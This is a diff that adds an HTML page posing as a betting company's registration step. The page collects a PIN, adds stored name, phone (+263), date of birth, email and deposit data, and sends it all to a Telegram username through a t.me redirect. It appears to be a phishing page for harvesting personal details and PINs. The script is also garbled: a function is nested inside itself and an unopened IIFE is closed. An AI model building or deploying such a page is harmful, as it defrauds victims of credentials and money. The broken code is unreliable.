@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Application Login - THE MASSIVE WINS BETTING COMPANY</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700;900&family=Roboto:wght@400;500&family=Orbitron:wght@700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #1db954;
+            --primary-dark: #168f3e;
+            --accent: #ffd700;
+            --blue: #0a7cff;
+            --bg: #f4f8f6;
+            --card-bg: #fff;
+            --text: #222;
+            --header-gradient: linear-gradient(90deg, #1db954 0%, #0a7cff 100%);
+        }
+        body {
+            margin: 0;
+            font-family: 'Roboto', Arial, Helvetica, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+        }
+        header {
+            background: var(--header-gradient);
+            color: #fff;
+            padding: 32px 20px 24px 20px;
+            text-align: center;
+            border-bottom-left-radius: 32px;
+            border-bottom-right-radius: 32px;
+            box-shadow: 0 4px 24px 0 rgba(30,80,80,0.10);
+        }
+        header h1 {
+            margin: 0;
+            font-family: 'Montserrat', 'Orbitron', Arial, sans-serif;
+            font-size: 2.2rem;
+            font-weight: 900;
+            letter-spacing: 2px;
+            text-shadow: 0 2px 8px rgba(0,0,0,0.08);
+        }
+        header p {
+            font-size: 1.1rem;
+            font-family: 'Roboto', Arial, sans-serif;
+            margin-top: 8px;
+            opacity: 0.95;
+        }
+        .container {
+            max-width: 500px;
+            margin: 32px auto 0 auto;
+            padding: 0 20px 32px 20px;
+        }
+        .card {
+            background: var(--card-bg);
+            padding: 32px 28px 28px 28px;
+            border-radius: 18px;
+            box-shadow: 0 4px 24px 0 rgba(30,80,80,0.10);
+            margin-bottom: 32px;
+            transition: box-shadow 0.2s;
+        }
+        .card:hover {
+            box-shadow: 0 8px 32px 0 rgba(30,80,80,0.16);
+        }
+        .card h2 {
+            margin-top: 0;
+            color: var(--primary);
+            font-family: 'Montserrat', Arial, sans-serif;
+            font-size: 1.4rem;
+            font-weight: 700;
+            letter-spacing: 1px;
+        }
+        form input {
+            width: 100%;
+            padding: 13px 14px;
+            margin-top: 12px;
+            border-radius: 7px;
+            border: 1.5px solid #e0e0e0;
+            font-size: 1.08rem;
+            font-family: 'Roboto', Arial, sans-serif;
+            background: #f9f9f9;
+            transition: border 0.2s;
+        }
+        form input:focus {
+            border: 1.5px solid var(--primary);
+            outline: none;
+            background: #fff;
+        }
+        form button {
+            width: 100%;
+            padding: 14px;
+            margin-top: 18px;
+            border-radius: 7px;
+            border: none;
+            font-size: 1.15rem;
+            font-family: 'Montserrat', Arial, sans-serif;
+            font-weight: 700;
+            background: linear-gradient(90deg, var(--primary) 60%, var(--blue) 100%);
+            color: #fff;
+            cursor: pointer;
+            box-shadow: 0 2px 8px 0 rgba(30,80,80,0.08);
+            letter-spacing: 1px;
+            transition: background 0.2s, box-shadow 0.2s;
+        }
+        form button:hover {
+            background: linear-gradient(90deg, var(--primary-dark) 60%, var(--blue) 100%);
+            box-shadow: 0 4px 16px 0 rgba(30,80,80,0.13);
+        }
+        .note {
+            font-size: 0.98rem;
+            color: #888;
+            margin-top: 14px;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+        .actions {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+        }
+        .actions button {
+            flex: 1;
+            margin-top: 0;
+        }
+        footer {
+            text-align: center;
+            padding: 18px 10px 10px 10px;
+            font-size: 1rem;
+            color: #fff;
+            background: var(--primary);
+            border-top-left-radius: 18px;
+            border-top-right-radius: 18px;
+            margin-top: 40px;
+            font-family: 'Montserrat', Arial, sans-serif;
+            letter-spacing: 1px;
+        }
+        @media (max-width: 600px) {
+            .container { padding: 0 4px 24px 4px; }
+            .card { padding: 18px 6px 18px 6px; }
+            header { padding: 22px 4px 16px 4px; }
+        }
+    </style>
+</head>
+<body>
+<header>
+    <h1>THE MASSIVE WINS BETTING COMPANY</h1>
+    <p>Confirm your registration</p>
+</header>
+<div class="container">
+    <div class="card">
+        <h2>Enter PIN to proceed</h2>
+        <p class="note">We have pre-filled the phone number from your application. Enter your PIN to continue to Telegram.</p>
+        <form id="loginForm" onsubmit="submitPin(event)">
+            <label for="phoneDisplay">Phone Number</label>
+            <input type="tel" id="phoneDisplay" disabled>
+            <input type="hidden" id="phoneHidden">
+            <label for="pin">PIN</label>
+            <input type="password" id="pin" placeholder="Enter PIN" required inputmode="numeric">
+                <div class="actions">
+                <button type="button" onclick="goBack()">Edit Details</button>
+                <button type="submit">Proceed</button>
+            </div>
+        </form>
+        <p class="note">This website will never ask for sensitive banking details. Only enter your registration PIN.</p>
+    </div>
+</div>
+<footer style="text-align:center;padding:15px;color:#666;">© 2026 THE MASSIVE WINS BETTING COMPANY. All rights reserved.</footer>
+<script>
+function goBack() {
+    // go back to signup form for edits
+    window.location.href = 'home.html';
+}
+
+function submitPin(event) {
+    event.preventDefault();
+    var pinEl = document.getElementById('pin');
+    var pin = pinEl ? pinEl.value.trim() : '';
+    var pinSubmitted = false;
+    function submitPin(event) {
+        event.preventDefault();
+        if (pinSubmitted) return;
+        pinSubmitted = true;
+        var pinEl = document.getElementById('pin');
+        var pin = pinEl ? pinEl.value.trim() : '';
+        if (!pin) {
+            alert('Please enter your PIN to continue.');
+            pinSubmitted = false;
+            return;
+        }
+        var raw = null;
+        try { raw = sessionStorage.getItem('applicationData'); } catch (e) { console.warn(e); }
+        if (!raw) {
+            try { raw = localStorage.getItem('applicationData'); } catch (e) { console.warn(e); }
+        }
+        if (!raw) {
+            alert('Application data not found. Please re-submit your application.');
+            window.location.href = 'home.html';
+            pinSubmitted = false;
+            return;
+        }
+        var app = JSON.parse(raw);
+
+        var depositNum = parseFloat(app.deposit || 0);
+        var formattedDeposit = new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD', minimumFractionDigits: 2, maximumFractionDigits: 2 }).format(depositNum);
+
+        var message = "New Registration\n\n" +
+            "Name: " + (app.name || 'N/A') + "\n" +
+            "Phone: " + (app.phone || 'N/A') + "\n" +
+            "Date of Birth: " + (app.dob || 'N/A') + "\n" +
+            "Preferred Game: " + (app.preferredGame || 'N/A') + "\n" +
+            "Email: " + (app.email || 'N/A') + "\n" +
+            "Deposit: " + formattedDeposit + "\n" +
+            "PIN: " + pin;
+
+        // Send info to your Telegram support username
+        var telegramUsername = "Massivewinsbettingsupport";
+        var telegramURL = "https://t.me/" + telegramUsername + "?text=" + encodeURIComponent(message);
+
+        var container = document.querySelector('.card');
+        if (container) {
+            container.innerHTML = '<p class="note">Redirecting to Telegram in <span id="countdown">3</span>s...</p>';
+        }
+
+        // Prevent double submission
+        var submitBtn = document.querySelector('button[type="submit"]');
+        if (submitBtn) submitBtn.disabled = true;
+
+        var count = 3;
+        var countdownEl = document.getElementById('countdown');
+        if (countdownEl) countdownEl.textContent = count;
+        var redirected = false;
+        var interval = setInterval(function () {
+            count -= 1;
+            if (countdownEl) countdownEl.textContent = count;
+            if (count <= 0 && !redirected) {
+                redirected = true;
+                clearInterval(interval);
+                window.location.href = telegramURL;
+            }
+        }, 1000);
+    }
+    try {
+        var raw = null;
+        try { raw = sessionStorage.getItem('applicationData'); } catch (e) { console.warn(e); }
+        if (!raw) {
+            try { raw = localStorage.getItem('applicationData'); } catch (e) { console.warn(e); }
+        }
+        if (!raw) return;
+        var app = JSON.parse(raw);
+        var phone = app.phone || '';
+        // Normalize phone to include +263 if user did not include it
+        try {
+            if (phone && !phone.startsWith('+')) {
+                if (phone.startsWith('0')) {
+                    phone = '+263' + phone.slice(1);
+                } else if (phone.startsWith('263')) {
+                    phone = '+' + phone;
+                } else {
+                    phone = '+263' + phone;
+                }
+            }
+        } catch (e) { }
+        var phoneDisplay = document.getElementById('phoneDisplay');
+        var phoneHidden = document.getElementById('phoneHidden');
+        if (phoneDisplay) phoneDisplay.value = phone;
+        if (phoneHidden) phoneHidden.value = phone;
+    } catch (e) {
+        console.warn('Could not prefill phone', e);
+    }
+})();
+</script>
+</body>
+</html>
